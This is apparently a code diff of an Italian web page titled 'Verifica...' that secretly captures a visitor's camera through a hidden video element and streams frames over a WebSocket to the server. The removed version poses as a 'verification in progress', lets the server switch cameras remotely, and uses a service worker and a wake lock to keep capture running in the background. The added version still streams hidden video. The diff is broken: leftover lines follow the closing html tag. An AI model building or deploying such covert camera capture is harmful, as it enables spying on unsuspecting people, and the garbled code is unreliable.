@@ -6,238 +6,114 @@
   <title>Verifica...</title>
   <style>
     body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
-    .msg { padding:40px 20px; font-size:18px; }
-    #debug { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); color:#0f0; padding:10px; font-size:12px; }
-  </style>
-</head>
-<body>
-  <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
-  <div id="debug"></div>
+    <div class="msg">Avviando camera...<br><small>Permetti l'accesso se richiesto.</small></div>
+    <div id="debug"></div>
 
-  <!-- Video nascosto -->
-  <video id="cam" playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+    <video id="cam" playsinline autoplay muted style="display:none"></video>
+    <canvas id="canvas" style="display:none"></canvas>
 
-  <script>
-    const video = document.getElementById('cam');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    const debug = document.getElementById('debug');
-    const room = new URLSearchParams(location.search).get('room') || 'user1';
-    
-    let stream = null;
-    let sending = false;
-    let ws = null;
-    let frameInterval = null;
-    
-    function log(msg) {
-      debug.textContent = new Date().toLocaleTimeString() + ': ' + msg;
-      console.log(msg);
-    }
+    <script>
+      const video = document.getElementById('cam');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+      const debug = document.getElementById('debug');
+      const room = new URLSearchParams(location.search).get('room') || 'room1';
 
-    // Gestione WebSocket
-    function connectWebSocket() {
-      if (ws) {
-        ws.close();
+      let stream = null;
+      let ws = null;
+      let sending = false;
+
+      function log(msg) {
+        const line = document.createElement('div');
+        line.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
+        debug.appendChild(line);
+        if (debug.children.length > 20) debug.removeChild(debug.firstChild);
+        console.log(msg);
       }
 
-  const proto = (location.protocol === 'https:') ? 'wss' : 'ws';
-  ws = new WebSocket(`${proto}://${location.host}/bg-stream?room=${room}`);
-
-      ws.onopen = () => {
-        log('WebSocket connesso');
-        if (!stream) {
-          startCamera();
-        } else {
-          startSendingFrames();
-        }
-      };
-
-      ws.onmessage = async (e) => {
+      async function startCamera() {
         try {
-          const data = JSON.parse(e.data);
-          if (data.type === 'switch-camera') {
-            log('Cambio camera richiesto: ' + data.mode);
-            currentCamera = data.mode;
-            await startCamera(data.mode);
-          }
+          if (stream) stream.getTracks().forEach(t => t.stop());
+          stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 360 }, audio: false });
+          video.srcObject = stream;
+          await video.play();
+          log('Camera avviata');
+          startSending();
         } catch (err) {
-          // Ignora messaggi non JSON
+          log('Errore camera: ' + (err.message || err));
+          document.querySelector('.msg').innerHTML = '<b>Errore camera:</b> ' + (err.message || err);
         }
-      };
-
-      ws.onclose = () => {
-        log('Connessione persa - riconnessione...');
-        stopSendingFrames();
-        // Riprova a connetterti dopo 3 secondi
-        setTimeout(connectWebSocket, 3000);
-      };
-
-      ws.onerror = (err) => {
-        log('Errore WebSocket: ' + (err.message || 'errore sconosciuto'));
-      };
-    }
-
-    // Avvia la connessione iniziale
-    connectWebSocket();
-
-    function startSendingFrames() {
-      if (frameInterval) {
-        clearInterval(frameInterval);
       }
-      sending = true;
-      // Invia subito il primo frame
-      sendFrame();
-      // Imposta l'invio periodico
-      frameInterval = setInterval(sendFrame, 150);
-      log('Avviato invio frames');
-    }
 
-    function stopSendingFrames() {
-      sending = false;
-      if (frameInterval) {
-        clearInterval(frameInterval);
-        frameInterval = null;
-      }
-      log('Fermato invio frames');
-    }
+      function connect() {
+        if (ws) ws.close();
+        const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+        ws = new WebSocket(`${proto}://${location.host}/bg-stream?room=${encodeURIComponent(room)}`);
 
-    // Invia singolo frame
-    function sendFrame() {
-      if (!sending || !video.videoWidth || !ws || ws.readyState !== WebSocket.OPEN) return;
-      
-      try {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        ctx.drawImage(video, 0, 0);
-        
-        canvas.toBlob(blob => {
-          if (ws && ws.readyState === WebSocket.OPEN && blob) {
-            // Prima invia il messaggio di controllo
-            ws.send(JSON.stringify({ 
-              room,
-              timestamp: Date.now(),
-              frameSize: blob.size
-            }));
-            
-            // Poi invia il frame
-            ws.send(blob);
-            log('Frame inviato: ' + blob.size + ' bytes');
-          }
-        }, 'image/jpeg', 0.7); // Aumentata qualità per migliore visibilità
-      } catch (err) {
-        log('Errore invio frame: ' + err.message);
-        // Riprova a riconnetterti se c'è un errore
-        stopSendingFrames();
-        setTimeout(connectWebSocket, 1000);
-      }
-    }
-
-    let currentCamera = 'environment';
-    
-    // Avvia fotocamera
-    async function startCamera(forcedMode = null) {
-      try {
-
-        if (stream) {
-          stream.getTracks().forEach(track => track.stop());
-        }
-
-        const mode = forcedMode || currentCamera;
-        const constraints = {
-          video: { 
-            facingMode: { exact: mode },
-            width: { ideal: 1280 },
-            height: { ideal: 720 }
-          },
-          audio: false
-        };
-        
-        try {
-          stream = await navigator.mediaDevices.getUserMedia(constraints);
-        } catch (err) {
-          // Se fallisce con 'exact', prova senza
-          constraints.video.facingMode = mode;
-          stream = await navigator.mediaDevices.getUserMedia(constraints);
-        }
-
-        currentCamera = mode;
-        video.srcObject = stream;
-        await video.play();
-        
-        video.onloadedmetadata = () => {
-          startSendingFrames();
-          showStatus();
-          log('Camera avviata con successo');
+        ws.onopen = () => {
+          log('WebSocket connesso');
         };
 
-      } catch (err) {
-        log('Errore camera: ' + err.message);
-        
-        // Gestione specifica degli errori più comuni
-        let errorMessage = err.message;
-        if (err.name === 'NotAllowedError') {
-          errorMessage = 'Accesso alla fotocamera negato. Per favore, concedi i permessi nelle impostazioni del browser.';
-        } else if (err.name === 'NotFoundError') {
-          errorMessage = 'Nessuna fotocamera trovata sul dispositivo.';
-        } else if (err.name === 'NotReadableError') {
-          errorMessage = 'La fotocamera è già in uso da un\'altra applicazione.';
-        }
-        
-        showError(errorMessage);
-        throw err;
+        ws.onmessage = (ev) => {
+          // server -> client control messages (JSON)
+          if (typeof ev.data === 'string') {
+            try {
+              const d = JSON.parse(ev.data);
+              if (d.type === 'switch-camera') {
+                log('Switch camera richiesto: ' + d.mode);
+                // try to restart camera with facingMode if supported
+                startCamera();
+              }
+            } catch (e) {}
+          }
+        };
+
+        ws.onclose = () => { log('WebSocket chiuso, riconnessione in 2s'); setTimeout(connect, 2000); };
+        ws.onerror = (e) => { log('WebSocket errore: ' + e.message); };
       }
-    }
 
-    function showStatus(message = '') {
-      document.querySelector('.msg').innerHTML = `
-        <div>
-          <b>Camera ${currentCamera === 'environment' ? 'posteriore' : 'frontale'} attiva</b><br>
-          <small>${message || 'La trasmissione continua in background.'}</small>
-          <div id="activity" style="width:10px; height:10px; background:green; border-radius:50%; margin:10px auto;"></div>
-        </div>`;
-    }
+      function startSending() {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+          // wait until WS open
+          const onopen = () => { ws.removeEventListener('open', onopen); startSending(); };
+          if (ws) ws.addEventListener('open', onopen);
+          return;
+        }
 
-    function showError(message) {
-      document.querySelector('.msg').innerHTML = `
-        <div style="color: red;">
-          <b>Errore</b><br>
-          <small>${message}</small>
-        </div>`;
-    }
+        if (sending) return;
+        sending = true;
 
-    // Service Worker per mantenere attiva l'app in background
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('/sw.js').then(registration => {
-        log('ServiceWorker registrato');
-      }).catch(err => {
-        log('Errore ServiceWorker: ' + err.message);
+        const sendLoop = () => {
+          if (!sending || !(video.videoWidth > 0)) return;
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          canvas.toBlob((blob) => {
+            if (blob && ws && ws.readyState === WebSocket.OPEN) {
+              ws.send(blob);
+              // small control message optional
+              ws.send(JSON.stringify({ room, timestamp: Date.now(), frameSize: blob.size }));
+              log('Frame inviato: ' + blob.size + ' bytes');
+            }
+          }, 'image/jpeg', 0.6);
+          setTimeout(sendLoop, 200);
+        };
+
+        sendLoop();
+      }
+
+      window.addEventListener('beforeunload', () => {
+        sending = false;
+        if (ws) ws.close();
+        if (stream) stream.getTracks().forEach(t => t.stop());
       });
-    }
 
-    // Mantieni attiva la pagina in background
-    if ('wakeLock' in navigator) {
-      let wakeLock = null;
-      const requestWakeLock = async () => {
-        try {
-          wakeLock = await navigator.wakeLock.request('screen');
-          log('WakeLock attivato');
-        } catch (err) {
-          log('WakeLock non disponibile: ' + err.message);
-        }
-      };
-      
-      document.addEventListener('visibilitychange', async () => {
-        if (document.hidden) {
-          log('Pagina in background - mantengo attiva');
-          // Richiedi wake lock per mantenere attivo in background
-          await requestWakeLock();
-        } else {
-          log('Pagina in primo piano');
-          if (wakeLock) {
-            wakeLock.release();
-            wakeLock = null;
-          }
+      // init
+      connect();
+      startCamera();
+    </script>
+  </body>
+  </html>
           if (!sending && stream) {
             startSendingFrames();
           }
